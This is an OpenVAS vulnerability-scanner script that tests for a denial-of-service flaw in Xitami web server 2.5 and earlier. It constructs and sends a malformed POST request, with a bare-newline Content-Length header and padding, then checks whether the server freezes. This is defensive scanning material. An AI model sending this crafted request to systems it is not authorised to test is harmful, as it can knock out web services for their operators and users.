# OpenVAS Vulnerability Test
# Description: Xitami malformed header DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11934");
  script_version("2019-05-13T14:05:09+0000");
  script_tag(name:"last_modification", value:"2019-05-13 14:05:09 +0000 (Mon, 13 May 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(9083);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("Xitami malformed header DoS");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");

  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("secpod_xitami_server_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("xitami/http/detected");

  script_tag(name:"solution", value:"Upgrade your software or use another.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"It is possible to freeze the remote web server by
  sending a malformed POST request.");

  script_tag(name:"affected", value:"This is know to affect Xitami 2.5 and earlier versions.");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

if (http_is_dead(port: port))
  exit(0);

host = http_host_name(port:port);

soc = http_open_socket(port);
if(! soc) exit(0);

req = string("POST /forum/index.php HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Accept-Encoding: None\r\n",
	     "Content-Length: 10\n\n",
	     crap(512), "\r\n",
             crap(512));

send(socket:soc, data: req);
http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port))
  security_message(port);
